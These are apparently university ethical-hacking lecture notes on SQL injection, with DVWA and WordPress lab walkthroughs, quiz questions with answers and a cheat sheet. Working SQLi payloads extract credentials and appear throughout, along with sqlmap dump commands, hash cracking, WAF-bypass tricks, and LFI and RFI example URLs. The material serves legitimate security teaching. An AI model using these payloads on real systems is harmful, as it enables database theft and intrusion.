# Week 7 — Web Application Attacks (SQL Injection)

> **Module:** UOP M31880 Ethical Hacking
> **Lecturer:** Tobi Fajana
> **Topic:** Web Application Attacks — SQL Injection (In-Band, Blind, Time-Based)

---

## Table of Contents

1. [What Is SQL Injection?](#1-what-is-sql-injection)
2. [Types of SQL Injection](#2-types-of-sql-injection)
3. [In-Band SQL Injection (Error & Union)](#3-in-band-sql-injection-error--union)
4. [Blind SQL Injection](#4-blind-sql-injection)
5. [Time-Based Blind SQL Injection](#5-time-based-blind-sql-injection)
6. [Out-of-Band SQL Injection](#6-out-of-band-sql-injection)
7. [SQL Injection Prevention](#7-sql-injection-prevention)
8. [Bypassing Defences](#8-bypassing-defences)
9. [Lab — DVWA SQL Injection Walkthrough](#9-lab--dvwa-sql-injection-walkthrough)
10. [Lab — Union-Based Data Extraction](#10-lab--union-based-data-extraction)
11. [Lab — Time-Based Blind SQLi](#11-lab--time-based-blind-sqli)
12. [Lab — WordPress SQL Injection Challenge](#12-lab--wordpress-sql-injection-challenge)
13. [Lab — Automating with SQLMap](#13-lab--automating-with-sqlmap)
14. [Practice Questions](#14-practice-questions)
15. [Cheat Sheet](#15-cheat-sheet)
16. [Recommended TryHackMe Labs](#16-recommended-tryhackme-labs)
17. [Recommended Reading](#17-recommended-reading)

---

## 1. What Is SQL Injection?

SQL Injection (SQLi) is an attack technique that exploits poorly developed applications by inserting malicious SQL code through user input. The application then treats this input as part of an SQL query to the backend database.

### How It Works

```
Normal:     SELECT * FROM users WHERE id = '1'
Injected:   SELECT * FROM users WHERE id = '' OR 1=1 #'
                                          ↑ attacker input
```

### Attack Vectors

- Any source that accepts user input
- Environment variables, URL parameters, form fields
- GET and POST requests
- Cookies and HTTP headers

### Steps to Find SQLi

1. **Find all sources** for sending data (forms, URL params, headers)
2. **Understand** how data is interpreted and processed
3. **Fuzz** — Manually, with Burp Suite Intruder, SQLMap, or WFUZZ

---

## 2. Types of SQL Injection

| Type | Description | Data Visible? |
|---|---|---|
| **In-Band** (Classic) | Data retrieved through the same channel used to inject | Yes — directly in response |
| **Inferential** (Blind) | Attacker cannot see data directly; relies on server behaviour | No — inferred from responses |
| **Time-Based Blind** | Subtype of blind; uses response delays to extract data | No — inferred from timing |
| **Out-of-Band** | Data transferred via different channel (e.g., DNS, email) | Yes — via alternate channel |

---

## 3. In-Band SQL Injection (Error & Union)

### Simple / Error-Based

Trigger database errors that reveal information:

```sql
-- Test for vulnerability
' OR 1=1 #
' OR 1=1 --

-- If the page returns all records or changes behavior, it's vulnerable
```

### Union-Based

The `UNION` operator combines results from multiple `SELECT` statements:

```sql
-- Step 1: Find number of columns (add numbers until no error)
' OR 1=1 UNION SELECT 1 #         -- Error: wrong column count
' OR 1=1 UNION SELECT 1,2 #       -- Success! (2 columns)

-- Step 2: Extract database version
' OR 1=1 UNION SELECT 1, version() #

-- Step 3: Get database name
' OR 1=1 UNION SELECT 1, database() #

-- Step 4: List all tables
' OR 1=1 UNION SELECT 1, table_name FROM information_schema.tables #

-- Step 5: Get column names from target table
' OR 1=1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' #

-- Step 6: Extract data
' OR 1=1 UNION SELECT user, password FROM users #
```

> **Key Rule:** Both `SELECT` statements in a `UNION` must return the **same number of columns**.

---

## 4. Blind SQL Injection

The attacker **cannot see** the database output directly. Instead, they infer information from how the application responds.

### Boolean-Based

Send queries that evaluate to `TRUE` or `FALSE` and observe different responses:

```sql
-- Does the first character of the database name = 'd'?
' AND SUBSTRING(database(),1,1) = 'd' #
-- If response differs from normal, it's TRUE
```

### How It Works

```
TRUE condition  → Normal page / specific response
FALSE condition → Different page / error / blank
```

By testing one character at a time, the entire database can be extracted — it's just slower.

---

## 5. Time-Based Blind SQL Injection

A subtype of blind SQLi where the attacker determines success by measuring **response time**.

### Functions Used

| Function | Database | Purpose |
|---|---|---|
| `SLEEP(n)` | MySQL | Pause execution for n seconds |
| `BENCHMARK(count, expr)` | MySQL | Repeat an expression to cause delay |
| `pg_sleep(n)` | PostgreSQL | Pause for n seconds |
| `WAITFOR DELAY` | MSSQL | Wait for specified time |

### Example

```sql
-- If admin user exists, delay 10 seconds
IF (SELECT user FROM users WHERE username='admin' AND SLEEP(10)) --

-- Using BENCHMARK
' AND BENCHMARK(10000000, SHA1(1337)) #

-- Union with BENCHMARK
' OR 1=1 UNION SELECT 1, BENCHMARK(100000000, SHA1(1337)) #
```

If the page takes significantly longer to load → the condition is TRUE.

### Automation

Tools like **SQLMap** and **WFUZZ** automate time-based blind injection by systematically testing characters.

---

## 6. Out-of-Band SQL Injection

Data is exfiltrated through a **different channel** than the injection point:

- DNS lookups to attacker-controlled domains
- HTTP requests to external servers
- Email (SMTP)

This is less common but useful when:
- In-band responses are blocked
- Blind techniques are too slow
- The database can make outbound connections

---

## 7. SQL Injection Prevention

| Prevention | Description |
|---|---|
| **Input validation** | Validate, filter, and sanitise all inputs |
| **Parameterised queries** | Use prepared statements — never concatenate user input into SQL |
| **Stored procedures** | Use pre-compiled SQL procedures |
| **Output escaping** | Escape special characters in output |
| **Whitelist validation** | Server-side whitelist of allowed input |
| **Database limits** | Use `LIMIT` to prevent mass data disclosure |
| **WAF / IDS / IPS** | Web Application Firewalls and intrusion detection |

### Example: Parameterised Query

```php
// VULNERABLE — string concatenation
$query = "SELECT * FROM users WHERE id = '$input'";

// SECURE — parameterised query
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$input]);
```

---

## 8. Bypassing Defences

Attackers may attempt to bypass SQLi protections using:

| Technique | Description |
|---|---|
| **Fuzzing** | Test many payload variations |
| **Encoding** | URL encoding, double encoding, hex encoding |
| **Encryption** | Encrypt payloads to bypass WAF pattern matching |
| **Internal components** | Exploit internal/trusted data paths |
| **Case variation** | `SeLeCt`, `UNION`, `UnIoN` |
| **Comments** | `/**/` to break up keywords: `UN/**/ION SE/**/LECT` |

---

## 9. Lab — DVWA SQL Injection Walkthrough

### Setup

1. Log into DVWA: `http://<target-ip>/dvwa/`
2. Set security to **Low**
3. Navigate to the SQL Injection tab

### Step-by-Step

**Test for vulnerability — enter User ID `1`:**
```
Translates to: SELECT first_name, last_name FROM users WHERE user_id = '1';
```

**Inject — enter `' OR 1=1 #`:**
```sql
SELECT first_name, last_name FROM users WHERE user_id = '' OR 1=1 #';
```
- `''` — empty user_id
- `OR 1=1` — always TRUE (returns all rows)
- `#` — comments out the rest of the query

If all users are returned → **SQLi confirmed**.

---

## 10. Lab — Union-Based Data Extraction

### Find Column Count

```sql
' OR 1=1 UNION SELECT 1 #          -- Error
' OR 1=1 UNION SELECT 1,2 #        -- Works! → 2 columns
```

### Extract Information

```sql
-- Database version
' OR 1=1 UNION SELECT 1, version() #

-- Database name
' OR 1=1 UNION SELECT 1, database() #

-- All tables in information_schema
' OR 1=1 UNION SELECT 1, table_name FROM information_schema.tables #

-- Columns in the 'users' table
' OR 1=1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' #
```

### Extract Credentials

```sql
-- Get usernames and password hashes
' OR 1=1 UNION SELECT user, password FROM users #

-- Concatenate multiple fields (bypass column limit)
' OR 1=1 UNION SELECT 1, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) FROM users #
```

> `0x0a` = newline character in hex, making the output readable.

### Crack the Hashes

Save the extracted hashes:
```
smithy: 5f4dcc3b5aa765d61d8327deb882cf99
```

Crack them:
```bash
john --wordlist=rockyou.txt hashes.txt
# OR
hashcat -m 0 hashes.txt rockyou.txt    # -m 0 = MD5
```

---

## 11. Lab — Time-Based Blind SQLi

### Test for Vulnerability

```sql
-- Standard blind test
' OR 1=1 --

-- BENCHMARK-based delay
' AND BENCHMARK(10000000, SHA1(1337)) #

-- Union with BENCHMARK
' OR 1=1 UNION SELECT 1, BENCHMARK(100000000, SHA1(1337)) #
```

If the page loads **significantly slower** → the injection point is vulnerable to time-based blind SQLi.

---

## 12. Lab — WordPress SQL Injection Challenge

Download the challenge VM: [HackerFest 2019](https://download.vulnhub.com/hackerfest/HF2019-Linux.ova)

### Manual Exploitation via REST API

```bash
# Test basic fields
http://<ip>/?rest_route=/wpgmza/v1/markers/&filter={}&fields=id

# Wildcard — retrieve all fields
http://<ip>/?rest_route=/wpgmza/v1/markers/&filter={}&fields=*

# Test boolean
http://<ip>/?rest_route=/wpgmza/v1/markers/&filter={}&fields=1=1

# Extract table names from information_schema
http://<ip>/?rest_route=/wpgmza/v1/markers/&filter={}&fields=* from information_schema.tables -- -

# Extract WordPress users
http://<ip>/?rest_route=/wpgmza/v1/markers/&filter={}&fields=* from wp_users -- -
```

### Metasploit WordPress Shell Upload

After cracking credentials, Metasploit has a module for uploading shells via the WordPress admin dashboard:
```bash
msfconsole
search wordpress admin shell upload
```

---

## 13. Lab — Automating with SQLMap

**SQLMap** automates SQL injection detection and exploitation:

```bash
# Scan a login form
sqlmap -u 'http://<ip>/login.php' \
  --forms \
  --dump-all \
  --risk=3 \
  --level=5 \
  -v 4 \
  --dbms=mysql

# When prompted for POST data:
user=admin&password=admin&s=Submit

# Answer "Y" to most prompts
```

### SQLMap Options

| Flag | Description |
|---|---|
| `--forms` | Automatically detect and test forms |
| `--dump-all` | Dump all database contents |
| `--risk=3` | Maximum risk level (more aggressive tests) |
| `--level=5` | Maximum testing level (more injection points) |
| `-v 4` | High verbosity |
| `--dbms=mysql` | Specify the database type |
| `--batch` | Non-interactive mode (use defaults) |
| `-D <db>` | Target specific database |
| `-T <table>` | Target specific table |

---

## 14. Practice Questions

**20 MCQs based on Week 6–7 web application attack material.**

---

**Q1.** Which command lists all files ending with `.sql` recursively from root?

- A. `search / -type f -name *.sql`
- B. `grep / -pattern *.sql`
- C. `find / -name *.sql -exec ls -l {}`
- D. `whereis / -type f -name *.sql`

<details><summary>Answer</summary>C. find / -name *.sql -exec ls -l {}</details>

---

**Q2.** Which is NOT a technique for finding input injection points in HTTP applications?

- A. Port Scanning
- B. OSINT
- C. Directory Scanning
- D. API Scanning

<details><summary>Answer</summary>A. Port Scanning — it finds open ports, not injection points within HTTP applications</details>

---

**Q3.** What type of attack uses `<script>` tags embedded in a URL to steal cookies?

<details><summary>Answer</summary>Cross-Site Scripting (XSS)</details>

---

**Q4.** What attack is a long string of repeated characters (`NNNNN...`) sent to a URL?

<details><summary>Answer</summary>Buffer Overflow (Red Code Worm — buffer overflow on IIS Server)</details>

---

**Q5.** Which tool would identify potential email address sources for a spam investigation?

<details><summary>Answer</summary>TheHarvester</details>

---

**Q6.** Which is NOT a contributing factor to successful session hijacking?

- A. Clear text transmission
- B. Unrandomised session keys
- C. Indefinite session expiration
- D. Account lockout for invalid session IDs
- E. Weak session ID generation

<details><summary>Answer</summary>D. Account lockout for invalid session IDs — this is a defensive measure, not a contributing factor</details>

---

**Q7.** A URL with `LANG=../../../../../../../etc/passwd` is what type of attack?

<details><summary>Answer</summary>Local File Inclusion (LFI)</details>

---

**Q8.** A URL with `LANG=http://attacker-ip:8080/hello.php` is what type of attack?

<details><summary>Answer</summary>Remote File Inclusion (RFI)</details>

---

**Q9.** Why are time-based blind SQLi attacks considered "blind"?

<details><summary>Answer</summary>The attacker doesn't see returned data directly — they infer results from response timing</details>

---

**Q10.** Which field in `information_schema` is most useful for discovering table names?

<details><summary>Answer</summary>table_name</details>

---

**Q11.** What is the main difference between reflected and stored XSS?

<details><summary>Answer</summary>Reflected attacks are temporary; stored attacks persist in the server</details>

---

**Q12.** Which vulnerability enables executing JavaScript in another user's browser to steal cookies?

<details><summary>Answer</summary>XSS (Cross-Site Scripting)</details>

---

**Q13.** What is a primary benefit of fuzzing tools like wfuzz?

<details><summary>Answer</summary>Enumerates potential attack vectors by providing varying payloads</details>

---

**Q14.** Which tool is unsuitable for automatic SQL injection exploitation?

- A. wfuzz
- B. Hydra
- C. Burp Suite
- D. sqlmap

<details><summary>Answer</summary>B. Hydra — it's a password brute-forcer, not an SQLi tool</details>

---

**Q15.** Which injection technique uses deliberate server response delays?

<details><summary>Answer</summary>Time-based Blind SQL Injection</details>

---

**Q16.** A penetration tester performs session hijacking via XSS. What data was stolen?

<details><summary>Answer</summary>Cookie information</details>

---

**Q17.** Which technique combines multiple SELECT queries into one result?

<details><summary>Answer</summary>Union-based SQL Injection</details>

---

**Q18.** A URL with `fields=* from wp_users -- -` injected via REST API is what attack?

<details><summary>Answer</summary>SQL Injection</details>

---

**Q19.** Which technique tests input sanitisation using lists of attack strings?

<details><summary>Answer</summary>Fuzzing</details>

---

**Q20.** Which is NOT a technique for finding injection points in HTTP?

- A. Directory Scanning
- B. Port Scanning
- C. OSINT
- D. API Enumeration

<details><summary>Answer</summary>B. Port Scanning</details>

---

## 15. Cheat Sheet

### SQL Injection Payloads

```sql
-- === Basic Tests ===
' OR 1=1 #                              -- MySQL comment
' OR 1=1 --                             -- SQL comment
' OR 1=1 -- -                           -- Alternative comment
" OR 1=1 #                              -- Double quote variant

-- === Union-Based Extraction ===
' UNION SELECT 1,2 #                    -- Find column count
' UNION SELECT 1,version() #            -- Database version
' UNION SELECT 1,database() #           -- Current database name
' UNION SELECT 1,table_name FROM information_schema.tables #
' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users' #
' UNION SELECT user,password FROM users #

-- === Concatenation ===
concat(col1,0x0a,col2,0x0a,col3)       -- Merge columns with newlines

-- === Time-Based Blind ===
' AND SLEEP(10) #                        -- MySQL delay
' AND BENCHMARK(10000000,SHA1(1337)) #   -- MySQL benchmark delay
'; WAITFOR DELAY '00:00:10' --           -- MSSQL delay

-- === Boolean Blind ===
' AND SUBSTRING(database(),1,1)='d' #    -- Test first char
```

### SQLMap

```bash
# Basic form scan
sqlmap -u 'http://target/page.php?id=1' --dbs

# Scan forms automatically
sqlmap -u 'http://target/login.php' --forms --dump-all

# Target specific database and table
sqlmap -u 'http://target/page.php?id=1' -D dbname -T users --dump

# WordPress REST API
sqlmap -u 'http://target/?rest_route=/wpgmza/v1/markers/&filter={}&fields=*' --dump
```

### Hash Cracking

```bash
# John the Ripper
john --wordlist=rockyou.txt hashes.txt

# Hashcat (MD5 = mode 0, SHA1 = mode 100)
hashcat -m 0 hashes.txt rockyou.txt
```

---

## 16. Recommended TryHackMe Labs

| Room | Difficulty | Free? | Why It's Relevant |
|---|---|---|---|
| [SQL Injection](https://tryhackme.com/room/sqlinjectionlm) | Easy | Sub | SQL injection fundamentals — in-band, blind, union-based |
| [SQL Injection Lab](https://tryhackme.com/room/sqlilab) | Medium | Sub | Hands-on SQLi exploitation against a vulnerable application |
| [DVWA](https://tryhackme.com/room/dvwa) | Easy | Free | Practice XSS, SQLi, and other OWASP vulnerabilities on DVWA |
| [Burp Suite: Repeater](https://tryhackme.com/room/burpsuiterepeater) | Easy | Sub | Intercept and modify HTTP requests — essential for manual SQLi |
| [OWASP Top 10](https://tryhackme.com/room/owasptop10) | Easy | Free | All OWASP Top 10 vulnerabilities with practical exercises |

**Suggested order:** OWASP Top 10 → SQL Injection → DVWA → Burp Suite: Repeater → SQL Injection Lab

---

## 17. Recommended Reading

- **Web Application Security, 2nd Edition** — Andrew Hoffman
- **Exploiting Software: How To Break Code** — Gary McGraw & Greg Hoglund
- **The Hacker Playbook 3** — Peter Kim
- **LinkedIn Learning:** [Ethical Hacking: SQL Injection](https://www.linkedin.com/learning/ethical-hacking-sql-injection/)

---

*Week 7 of 12 — UOP M31880 Ethical Hacking*
